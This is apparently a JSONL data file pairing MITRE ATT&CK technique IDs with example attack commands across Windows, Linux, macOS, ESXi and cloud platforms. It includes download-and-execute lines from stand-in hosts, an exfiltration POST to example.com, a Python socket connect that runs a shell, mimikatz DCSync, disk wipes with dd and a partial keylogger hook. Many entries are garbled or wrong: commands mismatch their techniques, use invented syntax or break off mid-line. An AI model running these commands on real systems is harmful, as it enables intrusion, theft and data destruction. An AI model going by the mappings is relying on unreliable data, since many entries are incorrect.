+{"ID": "T1018", "Name": "Remote System Discovery", "Platform": "ESXi", "Command": "esxcli network diag ping"}
+{"ID": "T1046", "Name": "Network Service Discovery", "Platform": "Containers", "Command": "nmap -sV -p 1-65535 <container_ip>"}
+{"ID": "T1590.001", "Name": "Domain Properties", "Platform": "PRE", "Command": "whois example.com"}
+{"ID": "T1518", "Name": "Software Discovery", "Platform": "ESXi", "Command": "esxcli software vib list"}
+{"ID": "T1538", "Name": "Cloud Service Dashboard", "Platform": "IaaS", "Command": "gcloud asset find --query=\"resource.type='gce_instance'\""}
+{"ID": "T1055.005", "Name": "Thread Local Storage", "Platform": "Windows", "Command": "CreateProcessWithTokenW"}
+{"ID": "T1622", "Name": "Debugger Evasion", "Platform": "Linux", "Command": "cat /proc/self/status | grep TracerPID"}
+{"ID": "T1036.006", "Name": "Space after Filename", "Platform": "Linux", "Command": "mv /path/to/evil.sh /path/to/good.sh"}
+{"ID": "T1547.007", "Name": "Re-opened Applications", "Platform": "macOS", "Command": "defaults write com.apple.loginwindow LoginWindowReopenApplications -bool YES"}
+{"ID": "T1608.006", "Name": "SEO Poisoning", "Platform": "PRE", "Command": "python google_search_results_poisoning.py"}
+{"ID": "T1550.002", "Name": "Pass the Hash", "Platform": "Windows", "Command": "runas /netonly /user:username /profile /env \"cmd.exe /c command\""}
+{"ID": "T1052", "Name": "Exfiltration Over Physical Medium", "Platform": "Linux", "Command": "lsblk"}
+{"ID": "T1574.002", "Name": "DLL Side-Loading", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SideLoader /t REG_SZ /d \"C:\\path\\to\\legitimate\\application.exe\" /f"}
+{"ID": "T1105", "Name": "Ingress Tool Transfer", "Platform": "ESXi", "Command": "curl https://example.com/tool.tar.gz -o /tmp/tool.tar.gz"}
+{"ID": "T1216.002", "Name": "SyncAppvPublishingServer", "Platform": "Windows", "Command": "wscript.exe \"C:\\Windows\\System32\\SyncAppvPublishingServer.vbs\" \"n; {PowerShell}\""}
+{"ID": "T1098.002", "Name": "Additional Email Delegate Permissions", "Platform": "Windows", "Command": "Add-MailboxPermission -Identity \"Target Mailbox\" -User \"Adversary Email\" -AccessRights FullAccess -InheritanceType All"}
+{"ID": "T1588.003", "Name": "Code Signing Certificates", "Platform": "PRE", "Command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout private_key.pem -out certificate.pem -days 365 -subj \"/C=US/ST=State/L=Locality/O=Organization/CN=example.com\""}
+{"ID": "T1126", "Name": "Network Share Connection Removal", "Platform": "Windows", "Command": "net use \\\\system\\share /delete"}
+{"ID": "T1648", "Name": "Serverless Execution", "Platform": "SaaS", "Command": "az function create --name \"malicious-function\" --script-path \"malicious-script\" --handler \"python\" --runtime \"python3.8\" --storage-account \"malicious-storage\" --os \"linux\" --timeout 300 --concurrent-executions 100 --manual-trigger allowed --webhook-enabled true --tags \"malicious\" \"serverless-execution\""}
+{"ID": "T1548.006", "Name": "TCC Manipulation", "Platform": "macOS", "Command": "sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"UPDATE access_records SET allowed = 1 WHERE info_type = 'kTCCInfoTypeCamera' AND info_type = 'kTCCInfoTypeScreenSharing'\""}
+{"ID": "T1084", "Name": "Windows Management Instrumentation Event Subscription", "Platform": "Windows", "Command": "wmic path win32_operatingSystem where caption=\"Windows 10\" call setFirmwareEnvironmentVariable \"EventSubscriber\" \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\path\\to\\script.ps1\""}
+{"ID": "T1160", "Name": "Launch Daemon", "Platform": "macOS", "Command": "launchctl load -w /Library/LaunchDaemons/<daemon_name>.plist"}
+{"ID": "T1055.008", "Name": "Ptrace System Calls", "Platform": "Linux", "Command": "ptrace(pid=1234, request=PTRACE_ATTACH)"}
+{"ID": "T1653", "Name": "Power Settings", "Platform": "Windows", "Command": "powercfg -change -standby-timeout-dc 0 -hibernate-off 0 -sleep-timeout 0"}
+{"ID": "T1027.007", "Name": "Dynamic API Resolution", "Platform": "Windows", "Command": "GetProcAddress(hModule, \"GetSystemMetrics\")"}
+{"ID": "T1021.001", "Name": "Remote Desktop Protocol", "Platform": "Windows", "Command": "mstsc"}
+{"ID": "T1037.001", "Name": "Logon Script (Windows)", "Platform": "Windows", "Command": "reg add \"HKCU\\Environment\" /v \"UserInitMprLogonScript\" /t REG_SZ /d \"C:\\path\\to\\script.bat\""}
+{"ID": "T1055.015", "Name": "ListPlanting", "Platform": "Windows", "Command": "SendMessageA(hListView, LVM_SETITEMPOSITION, 0, (LPARAM) payload);"}
+{"ID": "T1665", "Name": "Hide Infrastructure", "Platform": "ESXi", "Command": "esxcli network firewall ruleset add -action=0 -rule=1 -protocol=80 -direction=0 -dst=192.168.1.100"}
+{"ID": "T1484", "Name": "Domain or Tenant Policy Modification", "Platform": "Windows", "Command": "net localgroup \"Domain Admins\" /add \"adversary_account\""}
+{"ID": "T1220", "Name": "XSL Script Processing", "Platform": "Windows", "Command": "msxsl.exe script.jpeg script.jpeg"}
+{"ID": "T1596.005", "Name": "Scan Databases", "Platform": "PRE", "Command": "shodan search \"your_target\""}
+{"ID": "T1564.001", "Name": "Hidden Files and Directories", "Platform": "Linux", "Command": "ls -a"}
+{"ID": "T1578.001", "Name": "Create Snapshot", "Platform": "IaaS", "Command": "aws ec2 create-snapshot --description \"Snapshot for adversary\" --volume-id <volume_id>"}
+{"ID": "T1591.001", "Name": "Determine Physical Locations", "Platform": "PRE", "Command": "SEC EDGAR Search"}
+{"ID": "T1137.002", "Name": "Office Test", "Platform": "Windows", "Command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office\\test\\Special\\Perf\" /v \"DLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1587", "Name": "Develop Capabilities", "Platform": "PRE", "Command": "python develop_capabilities.py"}
+{"ID": "T1173", "Name": "Dynamic Data Exchange", "Platform": "Windows", "Command": "ddeexec \"cmd.exe /c calc\""}
+{"ID": "T1003.003", "Name": "NTDS", "Platform": "Windows", "Command": "ntdsutil files recover"}
+{"ID": "T1602.001", "Name": "SNMP (MIB Dump)", "Platform": "Network Devices", "Command": "snmpwalk -v 2c -c public 192.168.1.1"}
+{"ID": "T1001.002", "Name": "Steganography", "Platform": "Linux", "Command": "steghide embed -cf /path/to/coverfile.jpg -ef /path/to/embeddedfile.txt"}
+{"ID": "T1204.001", "Name": "Malicious Link", "Platform": "Linux", "Command": "curl http://example.com/malicious-script.sh && bash"}
+{"ID": "T1550.001", "Name": "Application Access Token", "Platform": "SaaS", "Command": "aws sts get-federated-token"}
+{"ID": "T1547.008", "Name": "LSASS Driver", "Platform": "Windows", "Command": "sc config lsass start= auto"}
+{"ID": "T1569.002", "Name": "Service Execution", "Platform": "Windows", "Command": "sc create MyService binPath= \"C:\\Windows\\System32\\cmd.exe /c calc.exe\""}
+{"ID": "T1078.004", "Name": "Cloud Accounts", "Platform": "IaaS", "Command": "aws iam create-user --user-name \"compromised_user\" --password \"WeakPassword123\""}
+{"ID": "T1480.001", "Name": "Environmental Keying", "Platform": "Linux", "Command": "python -c 'import os; key = os.urandom(16); print(os.urandom(16).hex())' | openssl enc -aes-256-cbc -a -in - -k -iv -out /dev/null -pass \"pass:\" | grep -o \".*\" | xargs -I {} bash -c 'echo {} | base64 -d | openssl enc -aes-256-cbc -d -in - -k {} -iv - | xargs -I {} bash -c 'echo {} | base64 -d | tar -xvf -'"}
+{"ID": "T1008", "Name": "Fallback Channels", "Platform": "Linux", "Command": "netstat -tulpn | grep 443"}
+{"ID": "T1680", "Name": "Local Storage Discovery", "Platform": "ESXi", "Command": "esxcli storage filesystem list"}
+{"ID": "T1564.004", "Name": "NTFS File Attributes", "Platform": "Windows", "Command": "icacls -Streams * /setowner everyone /inheritance:e"}
+{"ID": "T1558.003", "Name": "Kerberoasting", "Platform": "Windows", "Command": "klist targets /v2"}
+{"ID": "T1096", "Name": "NTFS File Attributes", "Platform": "Windows", "Command": "fsutil.exe attribute nul c:\\test.txt set:$STANDARD_RIGHTS_REQUIRED,0x80,\"Malicious Data\""}
+{"ID": "T1003.006", "Name": "DCSync", "Platform": "Windows", "Command": "mimikatz lsadump::dcsync /alluids /output c:\\output.txt"}
+{"ID": "T1124", "Name": "System Time Discovery", "Platform": "ESXi", "Command": "esxcli system clock get"}
+{"ID": "T1053.002", "Name": "At", "Platform": "Windows", "Command": "at 12:00 /interactive c:\\path\\to\\malicious.exe"}
+{"ID": "T1035", "Name": "Service Execution", "Platform": "Windows", "Command": "sc create \"Service Name\" binPath= \"C:\\path\\to\\binary.exe\""}
+{"ID": "T1055.001", "Name": "Dynamic-link Library Injection", "Platform": "Windows", "Command": "CreateRemoteThread(CreateProcessHandle, LoadLibraryA, VirtualAllocEx, WriteProcessMemory, \"C:\\\\path\\\\to\\\\dll.dll\")"}
+{"ID": "T1086", "Name": "PowerShell", "Platform": "Windows", "Command": "Invoke-Command -ScriptBlock {Start-Process -FilePath \"C:\\path\\to\\executable.exe\"}"}
+{"ID": "T1588.005", "Name": "Exploits", "Platform": "PRE", "Command": "python exploit-kit.py"}
+{"ID": "T1556", "Name": "Modify Authentication Process", "Platform": "Windows", "Command": "net stop winlogon"}
+{"ID": "T1546.017", "Name": "Udev Rules", "Platform": "Linux", "Command": "SUBSYSTEM==\"block\", RUN+=\"/bin/bash -c'malicious_content'\""}
+{"ID": "T1056.004", "Name": "Credential API Hooking", "Platform": "Windows", "Command": "Create a user-mode hook DLL with the following code:\n\n```c\n#include <Windows.h>\n\nHHOOK hHook;\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {\n        if (lParam == VK_RETURN) {\n            // Capture credentials\n        }\n    }\n    return CallNextHookEx(hHook, nCode, wParam, lParam);\n}\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n    hHook = SetWindowsHookEx"}
+{"ID": "T1495", "Name": "Firmware Corruption", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/mmcblk0 bs=512 count=1"}
+{"ID": "T1490", "Name": "Inhibit System Recovery", "Platform": "Containers", "Command": "docker run --rm -v /path/to/container:/backup -w /backup -e VOLUME_DRIVER=none -e VOLUME_OPTIONS=none -e VOLUME_NAME=none -e VOLUME_SIZE=none -e VOLUME_LABELS=none -e VOLUME_MODE=none -e VOLUME_DRIVER=none -e VOLUME_OPTIONS=none -e VOLUME_NAME=none -e VOLUME_SIZE=none -e VOLUME_LABELS=none -e VOLUME_MODE=none -e VOLUME_DRIVER=none -e VOLUME_OPTIONS=none -e VOLUME_NAME=none -e VOLUME_SIZE"}
+{"ID": "T1546.007", "Name": "Netsh Helper DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Netsh\" /v \"DLLs\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1566.003", "Name": "Spearphishing via Service", "Platform": "Linux", "Command": "`sudo python -c 'import socket,subprocess; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"target_ip\",1234)); subprocess.call([\"/bin/bash\",\"-c\",\"\\\"cat /etc/passwd\\\"\"])'"}
+{"ID": "T1090.001", "Name": "Internal Proxy", "Platform": "Linux", "Command": "httran -c \"connect 192.168.1.100:8080\""}
+{"ID": "T1216", "Name": "System Script Proxy Execution", "Platform": "Windows", "Command": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malicious.ps1')\""}
+{"ID": "T1094", "Name": "Custom Command and Control Protocol", "Platform": "Linux", "Command": "nc -lvp 1234"}
+{"ID": "T1102.001", "Name": "Dead Drop Resolver", "Platform": "ESXi", "Command": "esxcli network firewall ruleset add -action=0 -rule=1 -protocol=80 -direction=0 -dst=192.168.1.1"}
+{"ID": "T1118", "Name": "InstallUtil", "Platform": "Windows", "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe \"<path\\to\\assembly.dll>\""}
+{"ID": "T1001.001", "Name": "Junk Data", "Platform": "ESXi", "Command": "esxcli network ip interface ipv4 set -p <interface> -jumbo 1"}
+{"ID": "T1598.001", "Name": "Spearphishing Service", "Platform": "PRE", "Command": "python spearphish.py -t \"target_email@example.com\" -m \"Hello, I saw your job posting on LinkedIn and I'm interested in discussing further\""}
+{"ID": "T1043", "Name": "Commonly Used Port", "Platform": "Linux", "Command": "nc -v -w 3 192.168.1.100 80"}
+{"ID": "T1505.006", "Name": "vSphere Installation Bundles", "Platform": "ESXi", "Command": "esxcli software vib install --force"}
+{"ID": "T1552.007", "Name": "Container API", "Platform": "Containers", "Command": "docker ps -a"}
+{"ID": "T1584.001", "Name": "Domains", "Platform": "PRE", "Command": "nmap -sC -sV <target_domain>"}
+{"ID": "T1505.001", "Name": "SQL Stored Procedures", "Platform": "Windows", "Command": "EXEC xp_cmdshell 'cmd /c \"systeminfo\"'"}
+{"ID": "T1556.004", "Name": "Network Device Authentication", "Platform": "Network Devices", "Command": "show run | include username password"}
+{"ID": "T1561.001", "Name": "Disk Content Wipe", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/sdb bs=4096 count=100"}
+{"ID": "T1213.005", "Name": "Messaging Applications", "Platform": "SaaS", "Command": "Get-MicrosoftTeamsMessage -GroupId <groupId> -ChannelId <channelId> -MessageId <messageId>"}
+{"ID": "T1048.003", "Name": "Exfiltration Over Unencrypted Non-C2 Protocol", "Platform": "ESXi", "Command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"cmd\": \"ls\"}' http://example.com/exfiltrated_data"}
+{"ID": "T1027.015", "Name": "Compression", "Platform": "Linux", "Command": "zip -r compressed_archive.zip /path/to/directory/"}
+{"ID": "T1574.004", "Name": "Dylib Hijacking", "Platform": "macOS", "Command": "lipo -create -output malicious_dylib.dylib dylib1.o dylib2.o"}
+{"ID": "T1601.002", "Name": "Downgrade System Image", "Platform": "Network Devices", "Command": "copy tftp://<IP address of TFTP server>/<older OS image file> flash:; boot system flash:"}
+{"ID": "T1078.003", "Name": "Local Accounts", "Platform": "Linux", "Command": "cracklib -e /etc/passwd"}
+{"ID": "T1669", "Name": "Wi-Fi Networks", "Platform": "Linux", "Command": "airmon-ng start wlan0"}
+{"ID": "T1211", "Name": "Exploitation for Defense Evasion", "Platform": "Linux", "Command": "msfvenom -p linux/x86/shell_shocker LHOST=192.168.1.100 LPORT=443 -f bash -o shell.sh"}
+{"ID": "T1127", "Name": "Trusted Developer Utilities Proxy Execution", "Platform": "Windows", "Command": "powershell.exe -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malicious_payload.ps1')\""}
+{"ID": "T1529", "Name": "System Shutdown/Reboot", "Platform": "ESXi", "Command": "shutdown.hardaction=\"poweroff\""}
+{"ID": "T1218.014", "Name": "MMC", "Platform": "Windows", "Command": "mmc.exe -Embedding C:\\path\\to\\test.msc"}
+{"ID": "T1564.010", "Name": "Process Argument Spoofing", "Platform": "Windows", "Command": "WriteProcessMemory(0x12345678, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"C:\\\\Windows\\\\System32\\\\cmd.exe\", 0x1000, 0x40)"}
+{"ID": "T1077", "Name": "Windows Admin Shares", "Platform": "Windows", "Command": "net use \\\\remote_system_name\\C$ /u:username \"password\""}
+{"ID": "T1574.012", "Name": "COR_PROFILER", "Platform": "Windows", "Command": "setx COR_PROFILER \"C:\\path\\to\\profiler.dll\""}
